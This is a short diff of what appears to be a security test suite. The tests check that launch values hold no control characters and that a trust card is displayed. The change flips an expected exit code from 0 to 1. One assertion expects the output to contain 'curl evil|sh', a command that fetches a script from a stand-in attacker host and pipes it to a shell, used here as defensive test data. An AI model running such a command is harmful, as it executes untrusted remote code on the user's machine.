@@ -262,7 +262,7 @@ describe('SEC-2 F28/F3: launch values carry no control characters; the trust car
         return { schemaVersion: 1, approved: false, name: 'fx', scope: 'project', pinnedTools: 0 };
       } } as never);
     const text = [...cards.splice(0), out.join('')].join('\n');
-    expect(code).toBe(0);
+    expect(code).toBe(1);
     expect(text).toContain('curl evil|sh');
     // Matching control characters is the point of this assertion.
     // eslint-disable-next-line no-control-regex
